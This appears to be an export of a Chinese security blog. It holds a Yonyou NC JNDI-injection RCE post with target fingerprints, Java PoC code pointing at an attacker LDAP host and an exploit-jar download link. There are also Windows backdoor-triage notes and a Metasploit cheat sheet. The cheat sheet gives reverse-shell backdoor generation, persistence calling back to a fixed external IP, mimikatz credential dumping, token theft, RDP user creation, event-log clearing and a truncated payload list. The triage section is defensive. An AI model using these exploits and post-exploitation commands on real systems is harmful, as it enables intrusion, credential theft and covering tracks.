<h1 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h1><p>FOFA：title=”YONYOU NC”</p>
<p>ICONHASH：1085941792</p>
<p>长得像这样，这个最近还出了一个文件上传的漏洞。</p>
<p><img src="/images/NC6.5-2.jpg" alt="NC6.5-2"></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>我是个菜菜，代码分析略</p>
<h1 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h1><p>根据<a href="https://blog.sari3l.com/posts/608d18f0/">https://blog.sari3l.com/posts/608d18f0/</a> 的poc代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import nc.bs.framework.common.NCLocator;</span><br><span class="line"></span><br><span class="line">import java.util.Properties;</span><br><span class="line"></span><br><span class="line">public class poc &#123;</span><br><span class="line"></span><br><span class="line">    public static void attack(String url, String jndipath) &#123;</span><br><span class="line">        Properties env &#x3D; new Properties();</span><br><span class="line">        if (!url.startsWith(&quot;http&quot;)) &#123;</span><br><span class="line">            url &#x3D; &quot;http:&#x2F;&#x2F;&quot; + url;</span><br><span class="line">        &#125;</span><br><span class="line">        env.put(&quot;SERVICEDISPATCH_URL&quot;, url + &quot;&#x2F;ServiceDispatcherServlet&quot;);</span><br><span class="line">        NCLocator locator &#x3D; NCLocator.getInstance(env);</span><br><span class="line">        locator.lookup(jndipath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        attack(&quot;http:&#x2F;&#x2F;target&quot;, &quot;ldap:&#x2F;&#x2F;ip:port&#x2F;classname&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>生成了一个简单jar利用工具，效果看图。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar NC.jar 目标系统URL LDAP&#x2F;RMI服务地址</span><br></pre></td></tr></table></figure>
<p><img src="/images/NC6.5.jpg" alt="NC6.5"></p>
<p><img src="/images/NC6.5-1.jpg" alt="NC6.5-1"></p>
<p>工具下载地址：</p>
<p><a href="https://zxc12609.github.io/dL/NC6.5_JDNI_RCE.jar">点我下载</a></p>
]]></content>
      <categories>
        <category>Poc</category>
      </categories>
      <tags>
        <tag>用友NC</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows后门排查</title>
    <url>/2021/02/25/Windows%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5/</url>
    <content><![CDATA[<p>​        <em>排查是根据攻击来做的，攻击哪些地方，那么就排查哪些地方。也是抱着学习的态度，以下排查方式大部分是从网上找的，这里精简记录一下。</em><a id="more"></a></p>
<h1 id="文件检查"><a href="#文件检查" class="headerlink" title="文件检查"></a>文件检查</h1><p>这是最基础的，攻击者要操作必须传马，用杀毒扫webshell和后门木马就完了，木马免杀的情况需要用后面的技术排查。</p>
<h1 id="进程检查"><a href="#进程检查" class="headerlink" title="进程检查"></a>进程检查</h1><h2 id="进程数字签名"><a href="#进程数字签名" class="headerlink" title="进程数字签名"></a>进程数字签名</h2><p>PCHunter直接右键</p>
<p><img src="/images/pc-1.jpg" alt="pc-1"></p>
<h2 id="进程模块的数字签名"><a href="#进程模块的数字签名" class="headerlink" title="进程模块的数字签名"></a>进程模块的数字签名</h2><p>PCHunter查看模块直接右键</p>
<p><img src="/images/PC-2.jpg" alt="PC-2"></p>
<h2 id="网络进程"><a href="#网络进程" class="headerlink" title="网络进程"></a>网络进程</h2><p>这个很多工具可以看，命令也可以看</p>
<p><img src="/images/pc-3.jpg" alt="pc-3"></p>
<h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2><p>用ProcessExplorer看进行、命令、dll、句柄。</p>
<p><img src="/images/pc-4.jpg" alt="pc-4"></p>
<h2 id="进程内存注入"><a href="#进程内存注入" class="headerlink" title="进程内存注入"></a>进程内存注入</h2><p>用ProcessExplorer右键属性看。对比映像和内存的字符串，用diff工具对比不同之处，区别较大的、新增了奇怪的文件的，可能内存被注入。</p>
<p><img src="/images/pc-5.jpg" alt="pc-5"></p>
<h2 id="进程文件"><a href="#进程文件" class="headerlink" title="进程文件"></a>进程文件</h2><p>processhacker右键看属性</p>
<p><img src="/images/pc-6.jpg" alt="pc-6"></p>
<h2 id="驱动数字签名"><a href="#驱动数字签名" class="headerlink" title="驱动数字签名"></a>驱动数字签名</h2><p><img src="/images/pc-7.jpg" alt="pc-7"></p>
<h1 id="启动项检查"><a href="#启动项检查" class="headerlink" title="启动项检查"></a>启动项检查</h1><p>用Autoruns看</p>
<p><img src="/images/pc-8.jpg" alt="pc-8"></p>
<h1 id="内存排查"><a href="#内存排查" class="headerlink" title="内存排查"></a>内存排查</h1><p>排查进程中可疑的内存模块，找出可能是Shellcode的模块代码。</p>
<p>通过processhacker-【Momory】模块，找到【Type】为Private，权限为【RWX】，大小为180~300KB的模块。查到以下内容就导出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- - 1、权限是RWX权限的。</span><br><span class="line">- - 2、文件块大小在170~300内</span><br><span class="line">- - 3、代码头是以下3种字符</span><br><span class="line">           E8 DC C4 03</span><br><span class="line">           4D 5A</span><br><span class="line">           55 8B EC 8B 45</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>windows应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>metasploit命令整理</title>
    <url>/2021/03/23/metasploit%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<p><em>整理一下笔记，整理的过程对加强记忆很有帮助，不是抄的。</em><a id="more"></a>*</p>
<h2 id="列出payload"><a href="#列出payload" class="headerlink" title="列出payload"></a>列出payload</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom --list payloads | awk &#39;&#123;print $1&#125;&#39;</span><br></pre></td></tr></table></figure>
<h2 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.17.131 lport&#x3D;6666 -f exe -o backdoor.exe </span><br></pre></td></tr></table></figure>
<p>以上的方式不太方便，以下方式更方便</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在msf命令行下use payload</span><br><span class="line">generate -f raw -o 1.bin</span><br></pre></td></tr></table></figure>
<h2 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h2><p>以下文件保存为x.rb，使用-r参数加载文件。</p>
<p>所有命令都可以写成这么个文件进行自动加载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.17.131</span><br><span class="line">set LPORT 6666</span><br><span class="line">set ExitOnSession false</span><br><span class="line">set SessionCommunicationTimeout 0</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p>加载文件的监听方式确实比自己手动敲命令快，但更快的是下面的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">handler -H 10.211.55.2 -P 3333 -p windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br></pre></td></tr></table></figure>
<h3 id="持续监听"><a href="#持续监听" class="headerlink" title="持续监听"></a>持续监听</h3><p>可以在接收到seesion后继续监听端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set ExitOnSession false   </span><br></pre></td></tr></table></figure>
<h3 id="防止session超时退出"><a href="#防止session超时退出" class="headerlink" title="防止session超时退出"></a>防止session超时退出</h3><p>默认情况下，如果一个会话将在5分钟（300秒）没有任何活动，那么它会被杀死,为防止此情况可将此项修改为0</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set SessionCommunicationTimeout 0  </span><br></pre></td></tr></table></figure>
<h3 id="防止session强制关闭"><a href="#防止session强制关闭" class="headerlink" title="防止session强制关闭"></a>防止session强制关闭</h3><p>默认情况下，一个星期（604800秒）后，会话将被强制关闭,修改为0可永久不会被关闭</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set SessionExpirationTimeout 0 </span><br></pre></td></tr></table></figure>
<h2 id="meterpreter的各种命令"><a href="#meterpreter的各种命令" class="headerlink" title="meterpreter的各种命令"></a>meterpreter的各种命令</h2><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat c:\boot.ini	#查看文件内容,文件必须存在</span><br><span class="line">del c:\boot.ini #删除指定的文件</span><br><span class="line">download nimeia.txt &#x2F;root&#x2F;Desktop&#x2F;   #下载文件到本机上</span><br><span class="line">edit c:\boot.ini  # 编辑文件</span><br><span class="line">getlwd	#打印本地目录</span><br><span class="line">getwd	#打印工作目录</span><br><span class="line">lcd	#更改本地目录</span><br><span class="line">ls	#列出在当前目录中的文件列表</span><br><span class="line">lpwd	#打印本地目录</span><br><span class="line">pwd	#输出工作目录</span><br><span class="line">cd c:\\ 	#进入目录文件下</span><br><span class="line">rm file 	#删除文件</span><br><span class="line">mkdir dier 	#在受害者系统上的创建目录</span><br><span class="line">rmdir	#受害者系统上删除目录</span><br><span class="line">dir	#列出目标主机的文件和文件夹信息</span><br><span class="line">mv	#修改目标主机上的文件名</span><br><span class="line">upload &#x2F;root&#x2F;backdoor.exe c:\\users\\arche\\AppData\\local\\backdoor.exe	#上传文件</span><br><span class="line">search -d d:\\www -f web.config 	#search 文件，如search  -d c:\\  -f*.doc</span><br><span class="line">search -f autoexec.bat  #搜索文件</span><br><span class="line">search -f sea*.bat c:\\xamp\\</span><br></pre></td></tr></table></figure>
<h3 id="模块加载"><a href="#模块加载" class="headerlink" title="模块加载"></a>模块加载</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">load mimakatz		#不用多说  help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line"></span><br><span class="line">load powershell     #执行powershell命令</span><br><span class="line">load espia 			#截图的</span><br><span class="line">load extapi			#额外模块，一般用不到</span><br><span class="line">load lanattacks		#内网攻击模块</span><br></pre></td></tr></table></figure>
<h3 id="命令执行、通道、令牌"><a href="#命令执行、通道、令牌" class="headerlink" title="命令执行、通道、令牌"></a>命令执行、通道、令牌</h3><p>关于命令执行，可使用进入交互式shell执行命令，可以加载powershell模块执行命令，还可以使用execute后台执行，将命令放入channel。这里主要记录一下execute，在提权时可能有用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">execute		#执行cmd -d 在目标主机执行时显示的进程名称（用以伪装） -m 直接从内存中执行</span><br><span class="line">execute -cH -f     #c是将命令丢到通道中</span><br><span class="line">channel -r 4  #查看通道的执行结果</span><br><span class="line"></span><br><span class="line">use incognito</span><br><span class="line">execute -cH -f 	#命令</span><br><span class="line">list_tokens -g  </span><br><span class="line">impersonate_token &#39;NT AUTHORITY\NTLM Authentication&#39;	 使用令牌</span><br><span class="line">steal_token pid 偷令牌</span><br><span class="line"></span><br><span class="line">migrate pid 注入进程\进程转移</span><br></pre></td></tr></table></figure>
<h3 id="路由及转发"><a href="#路由及转发" class="headerlink" title="路由及转发"></a>路由及转发</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获取本地网络</span><br><span class="line">run get_local_subnets</span><br><span class="line">添加路由</span><br><span class="line">run autoroute -s 10.10.87.0&#x2F;27</span><br><span class="line">端口转发，指将本机(被控机)的端口转发到远程IP(msf服务端)的端口</span><br><span class="line">portfwd add -l 3389 -r 192.168.206.200 -p 3389</span><br></pre></td></tr></table></figure>
<h3 id="权限维持相关"><a href="#权限维持相关" class="headerlink" title="权限维持相关"></a>权限维持相关</h3><h4 id="persistence启动项后门"><a href="#persistence启动项后门" class="headerlink" title="persistence启动项后门"></a>persistence启动项后门</h4><p>这个后门太低级了，可以自行写入免杀的马到注册表中。当然要先上传马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run persistence -X -i 10 -p 6666 -r 103.45.188.176</span><br><span class="line"></span><br><span class="line">-X 系统开机自启</span><br><span class="line">-i 10 10秒重连一次</span><br><span class="line">-p 监听端口</span><br><span class="line">-r 监听机移除 persistence 后门的办法是删除 HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ 中的注册表键和 C:\WINDOWS\TEMP\ 中的 VBScript 文件。</span><br><span class="line"></span><br><span class="line">reg setval -k HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v backdoor -d c:\\users\\xxx\\AppData\\local\\backdoor.exe</span><br></pre></td></tr></table></figure>
<h4 id="metsvc服务后门"><a href="#metsvc服务后门" class="headerlink" title="metsvc服务后门"></a>metsvc服务后门</h4><p>这个也不行，权限维持还是用其他方法来做比较好</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run metsvc –A   #自动安装后门</span><br></pre></td></tr></table></figure>
<h4 id="开启RDP"><a href="#开启RDP" class="headerlink" title="开启RDP"></a>开启RDP</h4><h5 id="getgui"><a href="#getgui" class="headerlink" title="getgui"></a>getgui</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run getgui –h #查看帮助</span><br><span class="line">run getgui -e #开启远程桌面</span><br><span class="line">run getgui -u lltest2 -p 123456   #添加用户</span><br><span class="line">run getgui -f 6661 -e   #3389端口转发到6661</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</span><br></pre></td></tr></table></figure>
<h5 id="enable-rdp脚本"><a href="#enable-rdp脚本" class="headerlink" title="enable_rdp脚本"></a>enable_rdp脚本</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp  #开启远程桌面</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp USERNAME&#x3D;admin PASSWORD&#x3D;123456 #添加用户</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp FORWARD&#x3D;true LPORT&#x3D;6662  #将3389端口转发到6662</span><br><span class="line">脚本位于&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;post&#x2F;windows&#x2F;manage&#x2F;enable_rdp.rb</span><br><span class="line">通过enable_rdp.rb脚本可知：开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span><br></pre></td></tr></table></figure>
<h3 id="清除日志"><a href="#清除日志" class="headerlink" title="清除日志"></a>清除日志</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">clearev 清除事件日志</span><br></pre></td></tr></table></figure>
<h2 id="Payload参考"><a href="#Payload参考" class="headerlink" title="Payload参考"></a>Payload参考</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Framework Payloads (592 total) [--payload &lt;value&gt;]</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">    Name                                                Description</span><br><span class="line">    ----                                                -----------</span><br><span class="line">    aix&#x2F;ppc&#x2F;shell_bind_tcp                              Listen for a connection and spawn a command shell</span><br><span class="line">    aix&#x2F;ppc&#x2F;shell_find_port                             Spawn a shell on an established connection</span><br><span class="line">    aix&#x2F;ppc&#x2F;shell_interact                              Simply execve &#x2F;bin&#x2F;sh (for inetd programs)</span><br><span class="line">    aix&#x2F;ppc&#x2F;shell_reverse_tcp                           Connect back to attacker and spawn a command shell</span><br><span class="line">    android&#x2F;meterpreter&#x2F;reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP</span><br><span class="line">    android&#x2F;meterpreter&#x2F;reverse_https                   Run a meterpreter server in Android. Tunnel communication over HTTPS</span><br><span class="line">    android&#x2F;meterpreter&#x2F;reverse_tcp                     Run a meterpreter server in Android. Connect back stager</span><br><span class="line">    android&#x2F;meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell</span><br><span class="line">    android&#x2F;meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell</span><br><span class="line">    android&#x2F;meterpreter_reverse_tcp                     Connect back to the attacker and spawn a Meterpreter shell</span><br><span class="line">    android&#x2F;shell&#x2F;reverse_http                          Spawn a piped command shell (sh). Tunnel communication over HTTP</span><br><span class="line">    android&#x2F;shell&#x2F;reverse_https                         Spawn a piped command shell (sh). Tunnel communication over HTTPS</span><br><span class="line">    android&#x2F;shell&#x2F;reverse_tcp                           Spawn a piped command shell (sh). Connect back stager</span><br><span class="line">    apple_ios&#x2F;aarch64&#x2F;meterpreter_reverse_http          Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    apple_ios&#x2F;aarch64&#x2F;meterpreter_reverse_https         Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    apple_ios&#x2F;aarch64&#x2F;meterpreter_reverse_tcp           Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    apple_ios&#x2F;aarch64&#x2F;shell_reverse_tcp                 Connect back to attacker and spawn a command shell</span><br><span class="line">    apple_ios&#x2F;armle&#x2F;meterpreter_reverse_http            Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    apple_ios&#x2F;armle&#x2F;meterpreter_reverse_https           Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    apple_ios&#x2F;armle&#x2F;meterpreter_reverse_tcp             Run the Meterpreter &#x2F; Mettle server payload (stageless)</span><br><span class="line">    bsd&#x2F;sparc&#x2F;shell_bind_tcp                            Listen for a connection and spawn a command shell</span><br><span class="line">    bsd&#x2F;sparc&#x2F;shell_reverse_tcp                         Connect back to attacker and spawn a command shell</span><br><span class="line">    bsd&#x2F;vax&#x2F;shell_reverse_tcp                           Connect back to attacker and spawn a command shell</span><br><span class="line">    bsd&#x2F;x64&#x2F;exec                                        Execute an arbitrary command</span><br><span class="line">    bsd&#x2F;x64&#x2F;shell_bind_ipv6_tcp                         Listen for a connection and spawn a command shell over IPv6</span><br><span class="line">    bsd&#x2F;x64&#x2F;shell_bind_tcp                              Bind an arbitrary command to an arbitrary port</span><br><span class="line">    bsd&#x2F;x64&#x2F;shell_bind_tcp_small                        Listen for a connection and spawn a command shell</span><br><span class="line">    bsd&#x2F;x64&#x2F;shell_reverse_ipv6_tcp                      Connect back to attacker and spawn a command shell over IPv6</span><br><span class="line">    bsd&#x2F;x64&#x2F;shell_reverse_tcp                           Connect back to attacker and spawn a command shell</span><br><span class="line">    bsd&#x2F;x64&#x2F;shell_reverse_tcp_small                     Connect back to attacker and spawn a command shell</span><br><span class="line">    bsd&#x2F;x86&#x2F;exec                                        Execute an arbitrary command</span><br><span class="line">    bsd&#x2F;x86&#x2F;metsvc_bind_tcp                             Stub payload for interacting with a Meterpreter Service</span><br><span class="line">    bsd&#x2F;x86&#x2F;metsvc_reverse_tcp                          Stub payload for interacting with a Meterpreter Service</span><br><span class="line">    bsd&#x2F;x86&#x2F;shell&#x2F;bind_ipv6_tcp                         Spawn a command shell (staged). Listen for a connection over IPv6</span><br><span class="line">    bsd&#x2F;x86&#x2F;shell&#x2F;bind_tcp                              Spawn a command shell (staged). Listen for a connection</span><br><span class="line">    bsd&#x2F;x86&#x2F;shell&#x2F;find_tag                              Spawn a command shell (staged). Use an established connection</span><br><span class="line">    bsd&#x2F;x86&#x2F;shell&#x2F;reverse_ipv6_tcp                      Spawn a command shell (staged). Connect back to the attacker over IPv6</span><br><span class="line">    bsd&#x2F;x86&#x2F;shell&#x2F;reverse_tcp                           Spawn a command shell (staged). Connect back to the attacker</span><br><span class="line">    bsd&#x2F;x86&#x2F;shell_bind_tcp                              Listen for a connection and spawn a command shell</span><br><span class="line">    bsd&#x2F;x86&#x2F;shell_bind_tcp_ipv6                         Listen for a connection and spawn a command shell over IPv6</span><br><span class="line">    bsd&#x2F;x86&#x2F;shell_find_port                             Spawn a shell on an established connection</span><br><span class="line">    bsd&#x2F;x86&#x2F;shell_find_tag                              Spawn a shell on an established connection (proxy&#x2F;nat safe)</span><br><span class="line">    bsd&#x2F;x86&#x2F;shell_reverse_tcp                           Connect back to attacker and spawn a command shell</span><br><span class="line">    bsd&#x2F;x86&#x2F;shell_reverse_tcp_ipv6                      Connect back to attacker and spawn a command shell over IPv6</span><br><span class="line">    bsdi&#x2F;x86&#x2F;shell&#x2F;bind_tcp                             Spawn a command shell (staged). Listen for a connection</span><br><span class="line">    bsdi&#x2F;x86&#x2F;shell&#x2F;reverse_tcp                          Spawn a command shell (staged). Connect back to the attacker</span><br><span class="line">    bsdi&#x2F;x86&#x2F;shell_bind_tcp                             Listen for a connection and spawn a command shell</span><br><span class="line">    bsdi&#x2F;x86&#x2F;shell_find_port                            Spawn a shell on an established connection</span><br><span class="line">    bsdi&#x2F;x86&#x2F;shell_reverse_tcp                          Connect back to attacker and spawn a command shell</span><br><span class="line">    cmd&#x2F;mainframe&#x2F;apf_privesc_jcl                       (Elevate privileges for user. Adds SYSTEM SPECIAL and BPX.SUPERUSER to user profile. Does this by using an unsecure</span><br><span class="line">                                                        d&#x2F;updateable APF authorized library (APFLIB) and updating the user&#39;s ACEE using this program&#x2F;library. Note: This pr</span><br><span class="line">                                                        ivesc only works with z&#x2F;OS systems using RACF, no other ESM is supported.)</span><br><span class="line">    cmd&#x2F;mainframe&#x2F;bind_shell_jcl                        Provide JCL which creates a bind shell This implmentation does not include ebcdic character translation, so a clien</span><br><span class="line">                                                        t with translation capabilities is required. MSF handles this automatically.</span><br><span class="line">    cmd&#x2F;mainframe&#x2F;generic_jcl                           Provide JCL which can be used to submit a job to JES2 on z&#x2F;OS which will exit and return 0. This can be used as a t</span><br><span class="line">                                                        emplate for other JCL based payloads</span><br><span class="line">    cmd&#x2F;mainframe&#x2F;reverse_shell_jcl                     Provide JCL which creates a reverse shell This implementation does not include ebcdic character translation, so a c</span><br><span class="line">                                                        lient with translation capabilities is required. MSF handles this automatically.</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_awk                                   Listen for a connection and spawn a command shell via GNU AWK</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_busybox_telnetd                       Listen for a connection and spawn a command shell via BusyBox telnetd</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_inetd                                 Listen for a connection and spawn a command shell (persistent)</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_jjs                                   Listen for a connection and spawn a command shell via jjs</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_lua                                   Listen for a connection and spawn a command shell via Lua</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_netcat                                Listen for a connection and spawn a command shell via netcat</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_netcat_gaping                         Listen for a connection and spawn a command shell via netcat</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_netcat_gaping_ipv6                    Listen for a connection and spawn a command shell via netcat</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_nodejs                                Continually listen for a connection and spawn a command shell via nodejs</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_perl                                  Listen for a connection and spawn a command shell via perl</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_perl_ipv6                             Listen for a connection and spawn a command shell via perl</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_r                                     Continually listen for a connection and spawn a command shell via R</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_ruby                                  Continually listen for a connection and spawn a command shell via Ruby</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_ruby_ipv6                             Continually listen for a connection and spawn a command shell via Ruby</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_socat_udp                             Creates an interactive shell via socat</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_stub                                  Listen for a connection and spawn a command shell (stub only, no payload)</span><br><span class="line">    cmd&#x2F;unix&#x2F;bind_zsh                                   Listen for a connection and spawn a command shell via Zsh. Note: Although Zsh is often available, please be aware i</span><br><span class="line">                                                        t isn&#39;t usually installed by default.</span><br><span class="line">    cmd&#x2F;unix&#x2F;generic                                    Executes the supplied command</span><br><span class="line">    cmd&#x2F;unix&#x2F;interact                                   Interacts with a shell on an established socket connection</span><br><span class="line">    cmd&#x2F;unix&#x2F;pingback_bind                              Accept a connection, send a UUID, then exit</span><br><span class="line">    cmd&#x2F;unix&#x2F;pingback_reverse                           Creates a socket, send a UUID, then exit</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse                                    Creates an interactive shell through two inbound connections</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_awk                                Creates an interactive shell via GNU AWK</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_bash                               Creates an interactive shell via bash&#39;s builtin &#x2F;dev&#x2F;tcp. This will not work on circa 2009 and older Debian-based L</span><br><span class="line">                                                        inux distributions (including Ubuntu) because they compile bash without the &#x2F;dev&#x2F;tcp feature.</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_bash_telnet_ssl                    Creates an interactive shell via mkfifo and telnet. This method works on Debian and other systems compiled without</span><br><span class="line">                                                        &#x2F;dev&#x2F;tcp support. This module uses the &#39;-z&#39; option included on some systems to encrypt using SSL.</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_bash_udp                           Creates an interactive shell via bash&#39;s builtin &#x2F;dev&#x2F;udp. This will not work on circa 2009 and older Debian-based L</span><br><span class="line">                                                        inux distributions (including Ubuntu) because they compile bash without the &#x2F;dev&#x2F;udp feature.</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_jjs                                Connect back and create a command shell via jjs</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_ksh                                Connect back and create a command shell via Ksh. Note: Although Ksh is often available, please be aware it isn&#39;t us</span><br><span class="line">                                                        ually installed by default.</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_lua                                Creates an interactive shell via Lua</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_ncat_ssl                           Creates an interactive shell via ncat, utilizing ssl mode</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_netcat                             Creates an interactive shell via netcat</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_netcat_gaping                      Creates an interactive shell via netcat</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_nodejs                             Continually listen for a connection and spawn a command shell via nodejs</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_openssl                            Creates an interactive shell through two inbound connections</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_perl                               Creates an interactive shell via perl</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_perl_ssl                           Creates an interactive shell via perl, uses SSL</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_php_ssl                            Creates an interactive shell via php, uses SSL</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_python                             Connect back and create a command shell via Python</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_python_ssl                         Creates an interactive shell via python, uses SSL, encodes with base64 by design.</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_r                                  Connect back and create a command shell via R</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_ruby                               Connect back and create a command shell via Ruby</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_ruby_ssl                           Connect back and create a command shell via Ruby, uses SSL</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_socat_udp                          Creates an interactive shell via socat</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_ssh                                Connect back and create a command shell via SSH</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_ssl_double_telnet                  Creates an interactive shell through two inbound connections, encrypts using SSL via &quot;-z&quot; option</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_stub                               Creates an interactive shell through an inbound connection (stub only, no payload)</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_tclsh                              Creates an interactive shell via Tclsh</span><br><span class="line">    cmd&#x2F;unix&#x2F;reverse_zsh                                Connect back and create a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn&#39;t us</span><br><span class="line">                                                        ually installed by default.</span><br><span class="line">    cmd&#x2F;windows&#x2F;adduser                                 Create a new user and add them to local administration group. Note: The specified password is checked for common co</span><br><span class="line">                                                        mplexity requirements to prevent the target machine rejecting the user for failing to meet policy requirements. Com</span><br><span class="line">                                                        plexity check: 8-14 chars (1 UPPER, 1 lower, 1 digit&#x2F;special)</span><br><span class="line">    cmd&#x2F;windows&#x2F;bind_lua                                Listen for a connection and spawn a command shell via Lua</span><br><span class="line">    cmd&#x2F;windows&#x2F;bind_perl                               Listen for a connection and spawn a command shell via perl (persistent)</span><br><span class="line">    cmd&#x2F;windows&#x2F;bind_perl_ipv6                          Listen for a connection and spawn a command shell via perl (persistent)</span><br><span class="line">    cmd&#x2F;windows&#x2F;bind_ruby                               Continually listen for a connection and spawn a command 